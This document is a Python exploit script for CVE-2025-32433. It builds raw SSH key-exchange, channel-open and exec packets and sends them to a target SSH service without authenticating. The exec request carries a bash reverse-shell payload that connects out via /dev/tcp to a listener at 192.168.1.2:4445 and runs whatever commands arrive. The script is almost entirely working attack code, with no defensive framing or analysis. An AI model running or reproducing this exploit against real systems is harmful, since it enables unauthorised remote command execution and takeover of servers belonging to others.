#!/usr/bin/env python3
import os
import time
import ctypes
import struct
import random

BUFFER_SIZE = 4096
THOST = b"127.0.0.1"
TPORT = 2222
LHOST = "192.168.1.2"
LPORT = 4445

class Result(ctypes.Structure):
    _fields_ = [
        ("socket", ctypes.c_int),
        ("success", ctypes.c_bool),
        ("message", ctypes.c_char * 256)
    ]

def load_clib() -> ctypes.CDLL:
    try:
        lib = ctypes.CDLL("./core.dylib")
        ## `struct_return` -----------------------------------------
        lib.struct_return.argtypes = [ctypes.c_char_p]
        lib.struct_return.restype  = Result
        ## `sock_conn` ---------------------------------------------
        lib.sock_conn.argtypes     = [ctypes.c_char_p, ctypes.c_int]
        lib.sock_conn.restype      = Result
        ## `sock_send` ---------------------------------------------
        lib.sock_send.argtypes     = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]
        lib.sock_send.restype      = ctypes.c_int
        ## `sock_recv` ---------------------------------------------
        lib.sock_recv.argtypes     = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]
        lib.sock_recv.restype      = ctypes.c_ssize_t 
        ## `sock_close` ---------------------------------------------
        lib.sock_close.argtypes    = [ctypes.c_int]
        lib.sock_close.restype     = None
        return lib
    except Exception as e:
        print(f"Error loading library: {e}")
        return None

def csock_send(lib, fd, data):
    """Send data on the socket"""
    buf = ctypes.create_string_buffer(data)
    result = lib.sock_send(fd, buf, len(data))
    if result > 0:
        print(f"[+] Sent {result} bytes")
    else:
        print(f"[-] Send error: {os.strerror(ctypes.get_errno())}")
    return result

def csock_recv(lib, fd, size=BUFFER_SIZE) -> bytes:
    """Receive data from the socket"""
    recv_buf = ctypes.create_string_buffer(size)
    n = lib.sock_recv(fd, recv_buf, size)
    
    if n > 0:
        print(f"[+] Received {n} bytes")
        data = recv_buf.raw[:n]
        
        # Print hex and ASCII side by side
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            hex_line = " ".join([f"{b:02x}" for b in chunk])
            
            # Create ASCII representation (printable chars only)
            ascii_line = ""
            for byte in chunk:
                if 32 <= byte <= 126:  # Printable ASCII range
                    ascii_line += chr(byte)
                else:
                    ascii_line += "."
                    
            # Pad hex line for alignment
            hex_line = hex_line.ljust(16*3)
            print(f"{i:04x}: {hex_line}  |  {ascii_line}")
            
        return data
    elif n == 0:
        print("[-] Connection closed by server")
        return b''
    else:
        print(f"[-] Receive error: {os.strerror(ctypes.get_errno())}")
        return b''
    
####    CVE-2025-32433

def pack_string(s):
    """Pack string"""
    data = s.encode("utf-8")
    return struct.pack(">I", len(data)) + data

def pad_packet(data):
    """Pad an SSH packet according to the protocol"""
    padding_length = 8 - (len(data) + 5) % 8
    if padding_length < 4:
        padding_length += 8
    
    padding = bytes([random.randint(0, 255) for _ in range(padding_length)])
    packet_length = len(data) + padding_length + 1
    
    packet = struct.pack('>I', packet_length) + bytes([padding_length]) + data + padding
    return packet

# RFC 4253: https://datatracker.ietf.org/doc/html/rfc4253#section-7.1
def build_kex_init():
    """Build an SSH_MSG_KEXINIT packet"""

    def name_list(items):
        return pack_string(",".join(items))
    
    return (
        b"\x14"                                       # SSH_MSG_KEXINIT
        + b"\x00" * 16                                # cookie
        + name_list([                                 # kex_algorithms
            "curve25519-sha256",
            "ecdh-sha2-nistp256",
            "diffie-hellman-group-exchange-sha256",
            "diffie-hellman-group14-sha256"
        ])
        + name_list(["rsa-sha2-256", "rsa-sha2-512"]) # server_host_key_algorithms
        + name_list(["aes128-ctr"]) * 2               # encryption_algorithms x2 (c->s, s->c)
        + name_list(["hmac-sha1"]) * 2                # mac_algorithms x2 (||)
        + name_list(["none"]) * 2                     # compression_algorithms x2 (||)
        + name_list([]) * 2                           # languages x2 (||)
        + b"\x00"                                     # boolean
        + struct.pack(">I", 0)                        # reserved
    )

# RFC 4254: https://datatracker.ietf.org/doc/html/rfc4254#section-5.1
def build_channel_open(channel_id=0):
    """Build an SSH_MSG_CHANNEL_OPEN packet"""    
    return (
        b"\x5a"                         # SSH_MSG_CHANNEL_OPEN
        + pack_string("session")        # channel_type
        + struct.pack('>I', channel_id) # sender_channel
        + struct.pack('>I', 491520)     # initial_window_size
        + struct.pack('>I', 131072)     # maximum_packet_size
    )

# RFC 4254: https://datatracker.ietf.org/doc/html/rfc4254#section-5.4
def build_channel_request(channel_id=0, 
                          command=f'os:cmd("bash -c \'exec 5<>/dev/tcp/{LHOST}/{LPORT}; cat <&5 | while read line; do $line 2>&5 >&5; done\'").'):
    """Build an SSH_MSG_CHANNEL_REQUEST packet"""
    return (
        b"\x62"                         # SSH_MSG_CHANNEL_REQUES
        + struct.pack(">I", channel_id) # recipient channel
        + pack_string("exec")           # request type
        + b"\x01"                       # want_reply (boolean, TRUE)
        + pack_string(command)
    )

if __name__ == "__main__":
    lib = load_clib()
    if not lib:
        print("Failed to load library")
        exit(1)
        
    try: # CVE-2025-32433
        print("[*] Connecting to target...")
        res = lib.sock_conn(THOST, TPORT)
        if res.success:
            socket_fd = res.socket
            print(f"[+] Socket FD: {socket_fd}")
            
            # SSH banner
            csock_send(lib, socket_fd, b"SSH-2.0-OpenSSH\r\n")
            
            # Server's banner
            banner = csock_recv(lib, socket_fd)
            if banner:
                print(f"[!] Banner: {banner.strip().decode('utf-8', errors='ignore')}")
            
            time.sleep(0.2)
            csock_send(lib, socket_fd, pad_packet(build_kex_init()))
            
            try:
                kex_response = csock_recv(lib, socket_fd)
                if kex_response:
                    print("[!] Received KEX response")
                else:
                    print("[-] No KEX response received...")
            except:
                print("[-] No KEX response received...")
            
            time.sleep(0.2)
            csock_send(lib, socket_fd, pad_packet(build_channel_open()))
            
            time.sleep(0.5)
            csock_send(lib, socket_fd, pad_packet(build_channel_request()))
        else:
            print(f"[-] Connection failed: {res.message.decode()}")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        if 'socket_fd' in locals() and socket_fd >= 0:
            print("[*] Closing socket...")
            lib.sock_close(socket_fd)